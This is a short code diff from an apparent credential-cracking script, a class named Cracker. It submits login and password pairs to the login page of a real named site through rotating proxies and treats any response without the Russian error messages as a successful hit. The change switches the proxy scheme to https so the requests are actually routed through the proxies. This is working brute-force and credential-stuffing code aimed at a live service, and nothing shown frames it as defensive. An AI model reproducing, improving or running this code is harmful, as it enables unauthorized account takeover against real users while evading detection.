@@ -47,7 +47,7 @@ class Cracker:
             password = password.strip()
             password = password.replace('\\n','')
             try:
-                repl = r.post(url='https://shadowservants.ru/login',data={'login':login,'password':password, 'csrf_token':csrf},headers={"referer": "https://shadowservants.ru/login"},proxies={'http': "http://"+prox}, timeout=5)
+                repl = r.post(url='https://shadowservants.ru/login',data={'login':login,'password':password, 'csrf_token':csrf},headers={"referer": "https://shadowservants.ru/login"},proxies={'https': "https://"+prox}, timeout=5)
                 if "Неправильный логин или пароль" not in repl.text and "Пользователь неактивен" not in repl.text:
                     try:
                         os.mkdir('./workout/')
